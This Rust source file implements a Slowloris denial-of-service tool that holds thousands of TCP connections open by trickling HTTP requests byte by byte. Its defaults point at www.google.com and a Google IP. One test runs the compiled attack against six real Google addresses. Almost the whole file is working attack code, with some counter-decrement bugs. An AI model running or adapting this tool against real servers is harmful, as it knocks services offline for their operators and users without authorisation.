use chrono::Local;
use console::Term;
//use dns_lookup::lookup_addr;
//use dns_lookup::lookup_host;
use indicatif::{MultiProgress, ProgressBar, ProgressDrawTarget, ProgressStyle};
use rand::distributions::Alphanumeric;
use rand::{thread_rng, Rng};
use std::io::Write;
use std::net::{IpAddr, Ipv4Addr, /*Ipv6Addr,*/ TcpStream};
use std::sync::{Arc, Mutex};
use std::thread::{sleep, spawn};
use std::time::Duration as StdDuration;
use tracing::{event, Level};
//use tracing_subscriber::fmt::init;

// # IP addresses
// alias ip="dig +short myip.opendns.com @resolver1.opendns.com"
// alias localip="ipconfig getifaddr en0"
// alias ips="ifconfig -a | grep -o 'inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)' | awk '{ sub(/inet6? (addr:)? ?/, \"\"); print }'"
//

#[derive(Debug)]
struct Args {
    host: String,
    ip: IpAddr,
    port: u16,
    max_connections: u64,
    timeout_min: u64,
    timeout_max: u64,
    body_length_min: usize,
    body_length_max: usize,
}
impl Args {
    pub fn new() -> Self {
        Self {
            host: String::from(""),
            ip: std::net::IpAddr::V4(Ipv4Addr::new(142, 251, 175, 10)),
            port: 0,
            max_connections: 0,
            timeout_min: 0,
            timeout_max: u64::MAX,
            body_length_min: 0_usize,
            body_length_max: usize::MAX,
        }
    }
}

#[derive(Debug)]
struct Attrs {
    total_requests: u64,
    total_responses: u64,
    total_response_time: u64,
    current_connections: u64,
    current_threads: u64,
}

impl Attrs {
    pub fn new() -> Self {
        Self {
            total_requests: 0,
            total_responses: 1, // is one to not divide by zero before the first request
            total_response_time: 0,
            current_connections: 0,
            current_threads: 0,
        }
    }
}

fn _get_my_ip() -> Result<String, Box<dyn std::error::Error>> {
    //use std::io;
    use std::process::Command;

    let output = Command::new("dig")
        .arg("+short")
        .arg("myip.opendns.com")
        .arg("@resolver1.opendns.com")
        .output()?;

    if output.status.success() {
        let ip_address = String::from_utf8_lossy(&output.stdout);
        Ok(ip_address.trim().to_string())
    } else {
        // Convert stderr to a String
        match str::from_utf8(&output.stderr) {
            Ok(error_string) => {
                eprintln!("Error executing dig command: {}", error_string.trim());
                Ok(format!("Raw stderr: {:?}", error_string.trim()))
            }
            Err(e) => {
                eprintln!("Error converting stderr to String: {:?}", e);
                eprintln!("Raw stderr: {:?}", output.stderr);
                Ok(format!("Raw stderr: {:?}", output.stderr))
            }
        }
    }
}

fn main() {
    tracing_subscriber::fmt::init();

    // You can emit different levels of tracing events using macros:
    //tracing::trace!("This is a trace-level event");
    //tracing::debug!("This is a debug-level event");
    //tracing::info!("This is an info-level event");
    //tracing::warn!("This is a warning-level event");
    //tracing::error!("This is an error-level event");

    // You can also create and enter spans to represent a period of time
    // within your application's execution.
    let span = tracing::span!(Level::INFO, "processing_request", request_id = 123);
    let _enter = span.enter(); // Enter the span

    event!(Level::DEBUG, "Doing some work within the span");
    // ... your code that does the work ...
    event!(Level::INFO, "Finished processing request");

    // set the important application variables and states
    let args = Arc::new(parse_args());
    //let host = args.host.clone();
    tracing::trace!("args:{:?}", args);
    tracing::trace!("host:{:?}", args.host);
    tracing::trace!("ip:{:?}", args.ip);
    let attrs = Arc::new(Mutex::new(Attrs::new()));

    // create a progress bar
    // This progress bar show the user the currently sending connections in comparision to the maximum
    // amount of connections
    let progress_bars = MultiProgress::new();
    progress_bars.set_draw_target(ProgressDrawTarget::stdout_with_hz(10));
    let connection_bar = progress_bars.add(ProgressBar::new(args.max_connections).with_style(
        ProgressStyle::default_bar().template(
            "Average response time: {msg} ms\nSending connections: {pos}/{len}\n{wide_bar}",
        ),
    ));
    let success_bar = progress_bars.add(ProgressBar::new(100).with_style(
        ProgressStyle::default_bar().template("successful requests: {pos}%\n{wide_bar}"),
    ));

    // Hide the console cursor and clear the screen
    #[cfg(not(test))]
    #[allow(clippy::unit_arg)]
    Term::stdout().hide_cursor().unwrap_or({});
    #[cfg(not(test))]
    Term::stdout()
        .clear_screen()
        .unwrap_or_else(|_| println!("\n\n"));

    // change the Ctrl+C behaviour to just exit the process
    ctrlc::set_handler(|| std::process::exit(0)).expect("Could not change ctrl-c behaviour");
    println!("{}", args.host);
    println!("{:?}:{:?}", args.ip, args.port);
    tracing::debug!("body_length_min:{:?}", args.body_length_min);
    tracing::debug!("body_length_max:{:?}", args.body_length_max);

    // it's necessary to create a new thread so the progress-bars are displayed correctly
    spawn(move || {
        loop {
            let average_response_time;
            let successful_connects;
            let current_threads;
            let current_connections;
            {
                let attrs = attrs.lock().unwrap();
                average_response_time =
                    (attrs.total_response_time / attrs.total_responses).to_string();
                successful_connects =
                    ((attrs.total_responses as f64 / attrs.total_requests as f64) * 100.0) as u64;
                current_connections = attrs.current_connections;
                current_threads = attrs.current_threads;
                #[cfg(test)]
                tracing::trace!("current_threads:{:?}", current_threads);
            }

            // update the progress bar
            connection_bar.set_position(current_connections);
            connection_bar.set_message(&average_response_time);
            success_bar.set_position(successful_connects);

            // spawn a new thread if not enough connections exists
            if current_threads < args.max_connections {
                let args = Arc::clone(&args);
                let attrs = Arc::clone(&attrs);
                let port = args.port;

                {
                    let mut attrs = attrs.lock().unwrap();
                    attrs.current_threads += 1;
                    attrs.total_requests += 1;
                    tracing::debug!("current_threads:{:?}", attrs.current_threads);
                    tracing::debug!("current_threads:{:?}", attrs.total_requests);
                }

                spawn(move || {
                    tracing::debug!("\n{:?}", args);
                    tracing::debug!("\n{:?}", attrs);
                    tracing::debug!("\n{:?}", args.port);
                    new_socket(args, attrs, port);
                });
            }
        }
    });

    progress_bars.join().unwrap();
}

/// parses the arguments given to the application
fn parse_args() -> Args {
    use clap::{App, Arg};
    use dns_lookup::lookup_host;

    fn validate_range(string: &str) -> Result<(), String> {
        if parse_range(string).is_ok() {
            Ok(())
        } else {
            Err(
                "takes values in the form of: <time> | <start>..<end> | <start>..=<end>"
                    .to_string(),
            )
        }
    }

    let _ = Args::new(); //just a test
    let matches = App::new("Slow Loris")
        .about("A slow loris attack implementation in Rust")
        .author(clap::crate_authors!())
        .version(clap::crate_version!())
        .arg(
            Arg::with_name("address")
                .help("The ip address of the server.")
                .takes_value(true)
                .default_value("127.0.0.1")
                .required(true),
        )
        .arg(
            Arg::with_name("domain")
                .help("The domain of the server")
                .takes_value(true)
                .default_value("www.google.com")
                .required(false),
        )
        .arg(
            Arg::with_name("connections")
                .help("The amount of connections established")
                .short("c")
                .long("connections")
                .takes_value(true)
                .default_value("2000")
                .validator(|connections| {
                    if connections.parse::<u64>().is_ok() {
                        Ok(())
                    } else {
                        Err("must be an unsigned integer".to_string())
                    }
                }),
        )
        .arg(
            Arg::with_name("timeout")
                .help(
                    "specifies the timeout between each send byte in seconds\n\
            takes values in the form of: <time> | <start>..<end> | <start>..=<end>\n",
                )
                .short("t")
                .long("timeout")
                .takes_value(true)
                .default_value("5..10")
                .validator(|timeout| validate_range(&timeout)),
        )
        .arg(
            Arg::with_name("body_length")
                .help(
                    "specifies the body length of the request each connection sends\n\
            takes values in the form of: <length> | <start>..<end> | <start>..=<end>\n",
                )
                .short("b")
                .long("body_length")
                .takes_value(true)
                .default_value("11000")
                .validator(|length| validate_range(&length)),
        )
        .arg(
            Arg::with_name("port")
                .help("specifies the port to connect to")
                .short("p")
                .long("port")
                .takes_value(true)
                .default_value("443")
                .validator(|port| {
                    if port.parse::<u16>().is_ok() {
                        Ok(())
                    } else {
                        Err("must be an unsigned integer".to_string())
                    }
                }),
        )
        .get_matches();

    let port = matches.value_of("port").unwrap().parse().unwrap();
    let max_connections = matches.value_of("connections").unwrap().parse().unwrap();
    let (timeout_min, timeout_max) = parse_range(matches.value_of("timeout").unwrap()).unwrap();
    let body_length = parse_range(matches.value_of("body_length").unwrap()).unwrap();
    let (body_length_min, body_length_max) = (body_length.0 as usize, body_length.1 as usize);

    use dns_lookup::getnameinfo;
    use std::net::{IpAddr, SocketAddr};
    let host;
    //let ip;
    let mut ip: IpAddr = "127.0.0.1".parse().unwrap();
    //let port = args.port;
    let address = matches.value_of("address").unwrap();
    println!("address:{}", address);
    match address.parse::<IpAddr>() {
        Ok(parsed) => {
            host = dns_lookup::lookup_addr(&parsed).expect("Could not find hostname for given ip");
            ip = parsed;
            tracing::info!("{}:{}", host, ip);
        }
        Err(_) => {
            host = address.to_string();
            println!("host={}", host);
            tracing::debug!("{}", host);

            //let hostname = "localhost";
            //let ips: Vec<std::net::IpAddr> = lookup_host(hostname).unwrap();
            //            let socket: SocketAddr = (host, 0).into();

            //let mut ip: IpAddr = "127.0.0.1".parse().unwrap();
            let socket: SocketAddr = (ip, port).into();
            tracing::info!("{}", socket);

            //host = getnameinfo(&socket, 0).unwrap();

            let (name, service) = match getnameinfo(&socket, 0) {
                Ok((n, s)) => (n, s),
                Err(e) => panic!("Failed to lookup socket {:?}", e),
            };

            println!("name={}", name);
            println!("service={}", service);

            let ips: Vec<std::net::IpAddr> =
                lookup_host(&host).unwrap_or(vec!["192.168.1.1".parse().unwrap()]);
            //assert!(ips.contains(&"127.0.0.1".parse().unwrap()));
            //assert!(ips.contains(&"127.0.0.1".parse().unwrap()));

            //ip = match lookup_host(address) {
            //ip = match lookup_host(hostname) {
            ip = match lookup_host(&host) {
                Ok(ips) if ips.len() == 1 => ips[0],
                Ok(ips) if ips.len() == 2 => ips[1],
                _ => ips[0], //panic!("Could not find ip for given domain"),
            }
        }
    }

    Args {
        host,
        ip,
        port,
        max_connections,
        timeout_min,
        timeout_max,
        body_length_min,
        body_length_max,
    }
}

/// takes a str and ties to parse it into a tuple of a start and an end value
/// returns (<start_inclusive>, <end_exclusive>)
fn parse_range(string: &str) -> Result<(u64, u64), ()> {
    use regex::Regex;

    let ports_regex =
        Regex::new(r"^((?P<start>\d+)\.\.(?P<inclusive>=)?(?P<end>\d+)|(?P<single>\d+))$").unwrap();

    match ports_regex.captures(string) {
        Some(captures) => {
            if captures.name("single").is_some() {
                let single = captures.name("single").unwrap().as_str();
                let single: u64 = single.parse().unwrap();
                Ok((single, single + 1))
            } else {
                let start = captures.name("start").unwrap().as_str();
                let start: u64 = start.parse().unwrap();

                let end = captures.name("end").unwrap().as_str();
                let end: u64 = end.parse().unwrap();

                let inclusive = captures.name("inclusive").is_some();

                if inclusive {
                    Ok((start, end + 1))
                } else {
                    Ok((start, end))
                }
            }
        }
        None => Err(()),
    }
}

/// Tries to create a new TCPStream connection to the attacked server
/// If this succeeds a HTTP request is send byte by byte with a delay between
fn new_socket(args: Arc<Args>, attrs: Arc<Mutex<Attrs>>, port: u16) {
    let start = Local::now();

    let mut connection = match TcpStream::connect((args.ip, port)) {
        Ok(connection) => {
            let response_time = Local::now().signed_duration_since(start).num_milliseconds() as u64;

            let mut attrs = attrs.lock().unwrap();
            attrs.current_connections += 1;
            attrs.total_response_time += response_time;
            attrs.total_responses += 1;

            connection
        }
        Err(_) => return,
    };

    let time_out = thread_rng().gen_range(args.timeout_min, args.timeout_max);
    let time_out = StdDuration::from_secs(time_out);

    let body_length = thread_rng().gen_range(args.body_length_min, args.body_length_max);

    let request = http_request(&args.host, body_length);

    for byte in request.as_bytes() {
        if connection.write_all(&[*byte]).is_err() {
            let mut attrs = attrs.lock().unwrap();
            attrs.current_connections -= 1;
            attrs.current_threads -= 1;

            return;
        }
        sleep(time_out);
    }

    let mut attrs = attrs.lock().unwrap();
    attrs.current_connections -= 1;
    //#[cfg(test)]
    println!("{:?}", attrs.current_connections -= 1);
    attrs.current_threads -= 1;
    //#[cfg(test)]
    println!("{:?}", attrs.current_threads -= 1);
}

/// creates a http request from a http header and a http body
fn http_request(host: &str, body_length: usize) -> String {
    ////#[cfg(test)]
    //println!(
    //    "host:{}\nbody_length:{}",
    //    http_header(host, body_length),
    //    http_body(body_length)
    //);
    format!(
        "{}{}",
        http_header(host, body_length),
        http_body(body_length)
    )
}

/// creates a valid HTTP header with as much noise as possible
fn http_header(host: &str, content_length: usize) -> String {
    format!("\
    GET / HTTP/1.1\n\
    Host: {}\n\
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*; q=0.8,application/signed-exchange; v=b3; q=0.9,*/*;q=0.8\n\
    Accept-Charset: utf-8\n\
    Accept-Encoding: gzip,deflate,br\n\
    Accept-Language: en-US,en;q=0.9,en-UK;q=0.8,en;q=0.7,fr;q=0.6;de-DE\n\
    Cache-Control: cache\n\
    Connection: keep-alive\n\
    Content-Length: {}\n\
    Content-Type: application/x-www-form-urlencoded\n\
    Date: {}\n\
    If-Match: \"737060cd8c284d8af7ad3082f209582d\"\n\
    If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT\n\
    If-Unmodified-Since: {}\n\
    Max-Forwards: 1000\n\
    Pragma: cache\n\
    Range: bytes=0-10\n\
    TE: trailers, deflate\n\
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0\n\
    \n\
    ", host, content_length, Local::now().format("%a, %d %b %Y %T %Z"), Local::now())
}

/// creates a application/x-www-form-urlencoded encoded body
fn http_body(length: usize) -> String {
    const LINE_LENGTH: usize = 11;

    let lines = length / LINE_LENGTH;
    let rest = length % LINE_LENGTH;
    let mut string = String::new();

    for _ in 0..lines {
        let first: usize = thread_rng().gen_range(1, LINE_LENGTH - 1);
        let last = LINE_LENGTH - first - 1;

        string.push_str(&rand_string(first));
        string.push('=');
        string.push_str(&rand_string(last));
    }
    string.push_str(&rand_string(rest));
    //#[cfg(test)]
    //println!("{}", string);

    string
}

/// creates a random string
fn rand_string(length: usize) -> String {
    thread_rng()
        .sample_iter(&Alphanumeric)
        .take(length)
        .collect::<String>()
}

#[test]
fn test_app_no_arguments() -> Result<(), Box<dyn std::error::Error>> {
    use assert_cmd::Command;
    //use predicates::prelude::*;
    let ips = [
        "142.251.175.100",
        "142.251.175.101",
        "142.251.175.102",
        "142.251.175.113",
        "142.251.175.138",
        "142.251.175.139",
    ];
    for ip in ips {
        println!("test_app_no_arguments:testing:{}", ip);
        let mut cmd = Command::cargo_bin(env!("CARGO_PKG_NAME")).unwrap();
        cmd.args([ip, "-h"]);
        cmd.assert()
            .success()
            .stdout(predicates::str::starts_with(""));
    }
    Ok(())
}

#[test]
fn test_app_with_argument() -> Result<(), Box<dyn std::error::Error>> {
    use assert_cmd::Command;
    //use predicates::prelude::*;
    //cmd.arg("test_argument");
    let ips = [
        "142.251.175.100",
        "142.251.175.101",
        "142.251.175.102",
        "142.251.175.113",
        "142.251.175.138",
        "142.251.175.139",
    ];
    for ip in ips {
        println!("test_app_with_argument:testing:{}", ip);
        let mut cmd = Command::cargo_bin(env!("CARGO_PKG_NAME")).unwrap();
        cmd.args([ip]);
        cmd.assert()
            .success()
            .stdout(predicates::str::starts_with(""));
    }
    Ok(())
}

#[test]
fn test_app_exits_with_error() -> Result<(), Box<dyn std::error::Error>> {
    use assert_cmd::Command;
    use predicates::prelude::*;
    let mut cmd = Command::cargo_bin(env!("CARGO_PKG_NAME")).unwrap();
    cmd.arg("--invalid-option"); // Example of an argument that might cause an error

    cmd.assert()
        .failure()
        .stderr(predicate::str::contains("error:")); // Adjust based on your app's error message

    Ok(())
}
//use assert_cmd::Command;

#[test]
fn test_version() {
    use assert_cmd::Command;
    //use predicates::prelude::*;
    let mut cmd = Command::cargo_bin(env!("CARGO_PKG_NAME")).unwrap();
    cmd.arg("--version");
    cmd.assert()
        .success()
        .stdout(predicates::str::starts_with("Slow"));
    cmd.arg("-V");
    cmd.assert()
        .success()
        .stdout(predicates::str::starts_with("Slow"));

    let package_version = env!("CARGO_PKG_VERSION");

    println!("The current package version is: {}", package_version);

    // You can also access other Cargo-provided environment variables, such as:
    // CARGO_PKG_NAME: The name of the package
    // CARGO_PKG_AUTHORS: The authors of the package
    // CARGO_PKG_DESCRIPTION: The description of the package
    // CARGO_PKG_HOMEPAGE: The homepage URL of the package

    let package_name = env!("CARGO_PKG_NAME");
    let package_authors = env!("CARGO_PKG_AUTHORS");
    let package_description = env!("CARGO_PKG_DESCRIPTION");

    println!("Package Name: {}", package_name);
    println!("Package Authors: {}", package_authors);
    println!("Package Description: {}", package_description);
}

//* 142.251.175.139
//* 142.251.175.100
//* 142.251.175.101
//* 142.251.175.113
//* 142.251.175.138
//* 142.251.175.102
//#[test]
//fn cli_www_google_com() {
//    use assert_cmd::Command;
//    use predicates::prelude::*;
//    let ips = [
//        "142.251.175.100",
//        "142.251.175.101",
//        "142.251.175.102",
//        "142.251.175.113",
//        "142.251.175.138",
//        "142.251.175.139",
//    ];
//    for ip in ips {
//        let mut cmd = Command::cargo_bin(env!("CARGO_PKG_NAME")).unwrap();
//        cmd.arg(ip);
//        cmd.assert()
//            .success()
//            .stdout(predicates::str::starts_with(""));
//    }
//}
